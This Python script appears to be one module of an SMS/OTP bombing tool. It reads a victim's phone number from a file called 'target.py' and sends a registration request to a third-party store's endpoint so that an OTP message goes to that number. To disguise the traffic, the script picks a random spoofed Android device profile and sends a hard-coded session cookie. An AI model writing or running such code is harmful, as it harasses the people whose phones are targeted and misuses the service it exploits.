import json
import random
from typing import Any
import requests

OTP_API_URL = "https://store.genericaadhaar.com/home/register"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        payload = {
            'mobile_number': number,
            'login_btn': "login"
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'cache-control': "max-age=0",
            'sec-ch-ua': device["secChUa"],
            'sec-ch-ua-mobile': device["mobile"],
            'sec-ch-ua-platform': device["platform"],
            'upgrade-insecure-requests': "1",
            'origin': "https://store.genericaadhaar.com",
            'x-requested-with': "mark.via.gp",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://store.genericaadhaar.com/home/register",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=0, i",
            'Cookie': "ci_session=75qed7ftq3s4uqm8lvp3hcb6c9grn8rd; __cf_bm=jgDNLx_WZ6sDLegw9qpL6h7OL8btWZZ5KK74RvCJtmc-1793230507.5686026-1.0.1.1-kmrxfzmL7AhTxfNO_SuKFRWdFA4DeqQnX5LiXNLn2jrjwk9RtRp_J3xYxUjRy8IWF.FsIYvVZm6R.5iIO6v.tBXZl6Nz5FADadeXb4DeGPix1G5.8jzkKD8sanSRNKAn; browser_cookie=ez0wpnkZ6j91XGKY"
        }

        resp = requests.post(
            OTP_API_URL,
            headers=headers,
            data=payload,
            timeout=15,
        )

        result_text = resp.text

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to {number}",
                "status_code": resp.status_code,
                "data": {"raw": result_text},
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": {"raw": result_text},
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))
